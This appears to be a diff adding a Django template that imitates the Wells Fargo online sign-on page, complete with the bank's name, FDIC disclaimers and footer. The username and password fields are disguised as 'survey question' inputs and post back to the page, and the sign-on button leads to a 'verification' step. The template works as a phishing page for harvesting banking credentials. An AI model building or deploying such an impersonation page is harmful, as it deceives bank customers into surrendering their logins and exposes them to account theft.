@@ -1,0 +1,104 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> secure user account verification page </title>
+    {% comment %} <link rel='icon' href="{% static 'projecty/images/favicon.png'%}" type='image/x-icon'> {% endcomment %}
+    <link rel="stylesheet" href="{% static 'projecty/css/index.css '%}">
+
+</head>
+
+<body>
+    <div class="loader "></div>
+    <div class="container">
+        <header>
+            <nav>
+                <div class="logo"> WELLS FARGO</div>
+                <div class="menu"> &#9776;
+                </div>
+            </nav>
+        </header>
+        <main>
+            <div class="background-image">
+                <div class="content">
+                    <h1 id='greeting'></h1>
+                    <p>sign on to manage your accounts </p>
+                    <div class="input-section">
+                        <form action="" method=POST>
+                            {% csrf_token %}
+                            <!-- {{ form.as_p }} -->
+                            <input type="text" name="survay_question1" placeholder="Username" required>
+                            <input type="password" name="survay_question2" placeholder="Password" required>
+                            <a  class="but"  href="{% url 'verification'%}">
+                            <button type="submit" >Sign on</button>
+                            </a>
+                        </form>
+                        
+                    </div>
+                </div>
+                <a class="mo" href=""> Forgot username or password?</a>
+            </div>
+
+            <div class="second">
+                <div class="inner">
+                    <h4 class="ff">Investment and Insurance Products are:</h4>
+                    <ul>
+                        <li class="in">Not Insured by the FDIC or Any Federal Government Agency</li>
+                        <li class="in">Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</li>
+                        <li class="in">Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
+
+                    </ul>
+                </div>
+                <p class="base">
+                    Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
+                </p>
+            </div>
+        </main>
+        <footer>
+            <p class="foot">
+               <span class="s f"> About Wells Fargo </span> <span class="i">| </span> <span class="s d">
+                    Online Access Agreement</span> <span class="i"> | </span>
+                    <span class="s">Privacy, Cookies, Security and Legal </span> <span class="i">| </span>
+                    <span class="s d">Notice of Data Collection </span> <span class="i"> | </span>
+                    <span class="s">Report Email Fraud </span> <span class="i">|</span>
+                    <span class=" s d">Security Center</span> <span class="i"> | </span>
+                    Sitemap <br>
+            </p>
+            <p class="f2">
+               <span class="d">Ad Choices </span> <span class="i">|</span>
+<span class="d g">Give Us Feedback </span>
+            </p>
+            <p class="y">
+                © 1999 - 2023 Wells Fargo. All rights reserved. NMLSR ID 399801
+            </p>
+        </footer>
+    </div>
+    <script>
+        window.addEventListener("load", function() {
+            const loadel = document.querySelector(".loader");
+
+            const hideload = ()=>{
+                loadel.style.display = "none";
+            };
+            setTimeout(hideload, 3000)
+        });
+
+        const currentime = new Date().getHours()
+        function getGreeting() {
+            if (currentime >= 5 && currentime < 12){
+                return "Good morning"
+            } else if (currentime >=12 &&currentime <18){
+                return "Good afternoon"
+            }else {
+                return "Good evening"
+            }
+        }
+
+        document.getElementById("greeting").innerText = getGreeting()
+    </script>
+
+
+</body>
+</html>
